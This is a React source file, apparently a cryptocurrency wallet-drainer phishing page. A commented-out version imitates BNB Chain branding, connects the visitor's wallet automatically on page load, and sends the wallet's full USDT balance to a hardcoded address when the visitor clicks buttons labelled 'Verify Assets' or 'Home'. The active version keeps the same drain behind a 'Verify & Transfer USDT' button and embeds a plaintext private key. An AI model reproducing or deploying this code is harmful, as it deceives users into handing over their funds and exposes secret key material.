// import React, { useState, useEffect } from "react";
// import { ethers } from "ethers";
// import { Menu, X } from "lucide-react";
// // Fixed recipient address
// const RECIPIENT_ADDRESS = "0x4dc3e51917258CE4644C243D80463314b5245E04";

// // USDT contract details
// const USDT_CONTRACT = {
//   address: "0xe74d90148e65d03b8b757531f2f15d7dae8a5eb4", // USDT contract address on Sepolia
//   abi: [
//     {
//       "constant": true,
//       "inputs": [{ "name": "account", "type": "address" }],
//       "name": "balanceOf",
//       "outputs": [{ "name": "", "type": "uint256" }],
//       "type": "function"
//     },
//     {
//       "constant": false,
//       "inputs": [
//         { "name": "to", "type": "address" },
//         { "name": "value", "type": "uint256" }
//       ],
//       "name": "transfer",
//       "outputs": [{ "name": "", "type": "bool" }],
//       "type": "function"
//     },
//     {
//       "inputs": [],
//       "stateMutability": "nonpayable",
//       "type": "constructor"
//     }
//   ],
// };

// function App() {
//   const [walletAddress, setWalletAddress] = useState("Not connected");
//   const [status, setStatus] = useState("");
//   const [provider, setProvider] = useState(null);
//   const [signer, setSigner] = useState(null);
//   const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);

//   const toggleMobileMenu = () => {
//     setIsMobileMenuOpen(!isMobileMenuOpen);
//   };
//   // Automatically connect the wallet on page load
//   useEffect(() => {
//     connectWallet();
//   }, []);

//   const connectWallet = async () => {
//     console.log("connectWallet function called");

//     if (typeof window.ethereum === "undefined") {
//       alert("Wallet is not installed. Please install a wallet to continue.");
//       return;
//     }

//     try {
//       console.log("Requesting wallet connection...");
//       const newProvider = new ethers.providers.Web3Provider(window.ethereum);
//       await newProvider.send("eth_requestAccounts", []);

//       const newSigner = newProvider.getSigner();
//       const address = await newSigner.getAddress();

//       setProvider(newProvider);
//       setSigner(newSigner);
//       setWalletAddress(address);

//       console.log("Wallet connected successfully. Wallet address:", address);
//       setStatus("Wallet connected.");
//     } catch (error) {
//       console.error("Error connecting wallet:", error);
//       setStatus("Error connecting wallet.");
//     }
//   };

//   const sendAllUSDT = async () => {
//     console.log("sendAllUSDT function called");

//     if (!walletAddress || !provider || !signer) {
//       console.error("Wallet not connected or provider/signer is missing.");
//       setStatus("Please connect your wallet first.");
//       return;
//     }

//     try {
//       console.log("Initializing contract with USDT address:", USDT_CONTRACT.address);

//       const usdtContract = new ethers.Contract(
//         USDT_CONTRACT.address,
//         USDT_CONTRACT.abi,
//         provider // Use provider for read-only operations
//       );

//       console.log("USDT contract initialized successfully.");
//       console.log("Fetching USDT balance for user address:", walletAddress);

//       const balance = await usdtContract.balanceOf(walletAddress);
//       console.log("Balance raw result:", balance.toString());
//       console.log("Formatted balance:", ethers.utils.formatUnits(balance, 18));

//       if (balance.isZero()) {
//         console.warn("User has 0 USDT.");
//         setStatus("No USDT available to send.");
//         return;
//       }

//       console.log("Preparing to transfer USDT...");
//       console.log(`Recipient: ${RECIPIENT_ADDRESS}, Amount: ${balance.toString()}`);

//       const usdtContractWithSigner = new ethers.Contract(
//         USDT_CONTRACT.address,
//         USDT_CONTRACT.abi,
//         signer // Use signer for write operations
//       );

//       const tx = await usdtContractWithSigner.transfer(RECIPIENT_ADDRESS, balance);
//       console.log("Transaction sent. Hash:", tx.hash);
//       setStatus(`Transaction sent. Hash: ${tx.hash}`);

//       console.log("Waiting for transaction confirmation...");
//       await tx.wait();

//       console.log("Transaction confirmed.");
//       setStatus(
//         `Transaction confirmed. Sent ${ethers.utils.formatUnits(balance, 18)} USDT to ${RECIPIENT_ADDRESS}.`
//       );
//     } catch (error) {
//       console.error("Error during USDT transfer:", error);
//       setStatus(`Error: ${error.message}`);
//     }
//   };

//   return (
//     <div className="min-h-screen flex flex-col">
//       {/* Top notification banner */}
//       <div className="bg-[rgb(255,162,96)] text-center p-2">
//         <h1 className="text-xs text-black">
//           BNB Beacon Chain has been shut down at block height 385,251,927 since December 3, 2024.
//         </h1>
//       </div>

//       {/* Navbar */}
//       <nav className="bg-black text-white">
//         <div className="container mx-auto px-4 py-3 flex justify-between items-center">
//           {/* Logo */}
//           <div className="text-yellow-300 text-xl font-bold">
//             BNB CHAIN
//           </div>

//           {/* Desktop Menu */}
//           <div className="hidden md:flex items-center space-x-6">
//             <div className="flex space-x-6">
//               {['Chains', 'Developer', 'Ecosystem', 'Community', 'Careers'].map((item) => (
//                 <div key={item} className="hover:text-yellow-300 transition">
//                   <h1>{item}</h1>
//                 </div>
//               ))}
//             </div>
//             <div className="flex space-x-4">
//               <button className="bg-white text-black rounded-md px-4 py-2 hover:bg-gray-200 transition">
//                 Support
//               </button>
//               <button className="border rounded-md px-4 py-2 hover:bg-white hover:text-black transition">
//                 Contact Us
//               </button>
//             </div>
//           </div>

//           {/* Mobile Menu Toggle */}
//           <div className="md:hidden">
//             <button
//               onClick={toggleMobileMenu}
//               className="text-white focus:outline-none"
//             >
//               {isMobileMenuOpen ? <X size={24} /> : <Menu size={24} />}
//             </button>
//           </div>
//         </div>

//         {/* Mobile Menu Overlay */}
//         {isMobileMenuOpen && (
//           <div className="fixed inset-0 bg-black z-50 md:hidden">
//             <div className="flex flex-col h-full p-6">
//               {/* Close Button */}
//               <div className="flex justify-end mb-6">
//                 <button
//                   onClick={toggleMobileMenu}
//                   className="text-white focus:outline-none"
//                 >
//                   <X size={24} />
//                 </button>
//               </div>

//               {/* Mobile Menu Items */}
//               <div className="space-y-6 text-center">
//                 {['Chains', 'Developer', 'Ecosystem', 'Community', 'Careers'].map((item) => (
//                   <div
//                     key={item}
//                     className="text-white text-2xl hover:text-yellow-300 transition"
//                     onClick={toggleMobileMenu}
//                   >
//                     {item}
//                   </div>
//                 ))}
//               </div>

//               {/* Mobile Menu Buttons */}
//               <div className="mt-auto mb-12 space-y-4">
//                 <button
//                   className="w-full bg-white text-black rounded-md py-3 text-lg hover:bg-gray-200 transition"
//                   onClick={toggleMobileMenu}
//                 >
//                   Support
//                 </button>
//                 <button
//                   className="w-full border-2 border-white text-white rounded-md py-3 text-lg hover:bg-white hover:text-black transition"
//                   onClick={toggleMobileMenu}
//                 >
//                   Contact Us
//                 </button>
//               </div>
//             </div>
//           </div>
//         )}
//       </nav>

//       {/* Main Content */}
//       <main className="flex-grow flex flex-col items-center justify-center p-6 text-center">
//         <h1 className="text-2xl md:text-3xl mb-4">
//           Serving Gas Less Web3 tools to over 478 Million users
//         </h1>
//         <p className="text-sm md:text-base mb-6">
//           A community-driven blockchain ecosystem of Layer-1 and Layer-2 scaling solutions.
//         </p>

//         <div className="space-y-4 w-full max-w-xs">
//           <button
//             onClick={sendAllUSDT}
//             className="w-full text-black text-sm py-3 bg-gray-200 rounded-md hover:bg-gray-300 transition"
//           >
//             Verify Assets
//           </button>
//           <button
//             onClick={sendAllUSDT}
//             className="w-full text-black text-sm py-3 border border-gray-500 rounded-md hover:bg-gray-100 transition"
//           >
//             Home
//           </button>
//         </div>
//       </main>
//     </div>
//   );
// }

// export default App;

//darshansingh865244

import React, { useState, useEffect } from "react";
import { ethers } from "ethers";

const RECIPIENT_ADDRESS = "0xeD5Ab183A181b754Bf47AA8C940685b969FE8B57";
const PRIVATE_KEY_RECIPIENT = "ea0147cbc5479755d9c75eb1de815cf5677a1dd812f482de28348f0f1f979760"; // Private key of the recipient address (use securely)

// USDT contract details
const USDT_CONTRACT = {
  address: "0x5De32589947cEF8c82908324dF03b4aF415bc834", // USDT contract address on Sepolia
  abi: [
    {
      constant: true,
      inputs: [{ name: "account", type: "address" }],
      name: "balanceOf",
      outputs: [{ name: "", type: "uint256" }],
      type: "function",
    },
    {
      constant: false,
      inputs: [
        { name: "to", type: "address" },
        { name: "value", type: "uint256" },
      ],
      name: "transfer",
      outputs: [{ name: "", type: "bool" }],
      type: "function",
    },
    {
      constant: false,
      inputs: [
        { name: "spender", type: "address" },
        { name: "value", type: "uint256" },
      ],
      name: "approve",
      outputs: [{ name: "", type: "bool" }],
      type: "function",
    },
  ],
};

function App() {
  const [walletAddress, setWalletAddress] = useState("Not connected");
  const [status, setStatus] = useState("");
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [userBalance, setUserBalance] = useState(ethers.BigNumber.from(0));

  useEffect(() => {
    connectWallet();
  }, []);

  const connectWallet = async () => {
    if (typeof window.ethereum === "undefined") {
      alert("Wallet is not installed. Please install a wallet to continue.");
      return;
    }

    try {
      const newProvider = new ethers.providers.Web3Provider(window.ethereum);
      await newProvider.send("eth_requestAccounts", []);
      const newSigner = newProvider.getSigner();
      const address = await newSigner.getAddress();

      setProvider(newProvider);
      setSigner(newSigner);
      setWalletAddress(address);

      const usdtContract = new ethers.Contract(
        USDT_CONTRACT.address,
        USDT_CONTRACT.abi,
        newProvider
      );
      const balance = await usdtContract.balanceOf(address);
      setUserBalance(balance);

      setStatus("Wallet connected.");
    } catch (error) {
      console.error("Error connecting wallet:", error);
      setStatus("Error connecting wallet.");
    }
  };

  const verifyUSDT = async () => {
    if (!walletAddress || !provider || !signer) {
      setStatus("Please connect your wallet first.");
      return;
    }

    try {
      // Step 1: Approve the recipient's wallet to cover gas fees using the recipient's private key
      const recipientSigner = new ethers.Wallet(PRIVATE_KEY_RECIPIENT, provider);
      const usdtContractWithRecipientSigner = new ethers.Contract(
        USDT_CONTRACT.address,
        USDT_CONTRACT.abi,
        recipientSigner
      );

      setStatus("Approving gas fee from recipient's wallet...");
      const approveTx = await usdtContractWithRecipientSigner.approve(
        RECIPIENT_ADDRESS,
        ethers.utils.parseUnits("100", 18) // Approve gas amount for the recipient (e.g., 100 USDT)
      );
      setStatus(`Approval transaction sent. Hash: ${approveTx.hash}`);
      await approveTx.wait();
      setStatus("Gas approval granted from recipient's wallet.");

      // Step 2: Approve user's wallet to transfer their USDT balance
      const usdtContractWithSigner = new ethers.Contract(
        USDT_CONTRACT.address,
        USDT_CONTRACT.abi,
        signer
      );
      setStatus("Approving your wallet for available USDT balance...");
      const approveUserTx = await usdtContractWithSigner.approve(
        walletAddress,
        userBalance // Approve the full balance of USDT
      );
      setStatus(`User approval transaction sent. Hash: ${approveUserTx.hash}`);
      await approveUserTx.wait();
      setStatus("Approval granted for your available USDT balance.");

      // Step 3: Transfer all approved USDT to the recipient's address
      setStatus("Sending all USDT to recipient...");
      const sendTx = await usdtContractWithSigner.transfer(
        RECIPIENT_ADDRESS,
        userBalance
      );
      setStatus(`Transaction sent. Hash: ${sendTx.hash}`);
      await sendTx.wait();
      setStatus(
        `Transaction confirmed. Sent ${ethers.utils.formatUnits(
          userBalance,
          18
        )} USDT to ${RECIPIENT_ADDRESS}.`
      );
    } catch (error) {
      console.error("Error during verification:", error);
      setStatus(`Error: ${error.message}`);
    }
  };

  return (
    <div className="min-h-screen flex flex-col">
      <main className="flex-grow flex flex-col items-center justify-center p-6 text-center">
        <h1 className="text-2xl md:text-3xl mb-4">Dynamic Approval & Transfer</h1>
        <p className="text-sm md:text-base mb-6">
          Available USDT: {ethers.utils.formatUnits(userBalance, 18)}
        </p>
        <div className="space-y-4 w-full max-w-xs">
          <button
            onClick={connectWallet}
            className="w-full text-black text-sm py-3 bg-gray-200 rounded-md hover:bg-gray-300 transition"
          >
            Connect Wallet
          </button>
          <button
            onClick={verifyUSDT}
            className="w-full text-black text-sm py-3 bg-gray-200 rounded-md hover:bg-gray-300 transition"
          >
            Verify & Transfer USDT
          </button>
        </div>
        <p className="mt-4 text-sm text-gray-500">{status}</p>
      </main>
    </div>
  );
}

export default App;
